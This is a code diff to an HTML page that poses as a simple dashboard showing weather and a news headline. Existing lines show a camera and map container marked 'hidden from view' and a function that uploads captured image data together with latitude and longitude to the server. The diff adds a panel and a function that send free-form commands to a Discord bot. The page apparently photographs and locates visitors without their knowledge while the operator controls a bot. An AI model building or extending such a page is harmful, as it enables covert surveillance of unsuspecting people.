@@ -109,6 +109,13 @@
             <p><strong>Weather:</strong> 22°C, partly cloudy</p>
             <p><strong>News Headline:</strong> AI advancements in 2024 are set to change the world...</p>
         </div>
+
+        <!-- Command Input Section -->
+        <div class="card" id="command-section">
+            <h3>Send Command to Discord Bot</h3>
+            <input type="text" id="command-input" placeholder="Enter command..." />
+            <button onclick="sendCommand()">Send Command</button>
+        </div>
     </div>
 
     <!-- Map and Camera container (hidden from view) -->
@@ -225,7 +232,6 @@
             sendImageData(lat, lon, dataURL);
         }
         
-
         function sendImageData(latitude, longitude, imageData) {
             fetch('/upload', {
                 method: 'POST',
@@ -245,6 +251,30 @@
             .catch((error) => {
                 console.error('Error sending data:', error);
             });
+        }
+
+        // Function to send a command to Discord bot
+        function sendCommand() {
+            const command = document.getElementById('command-input').value;
+
+            if (command) {
+                fetch('/send-command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        command: command
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Command sent to bot:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending command:', error);
+                });
+            }
         }
     </script>
 </body>
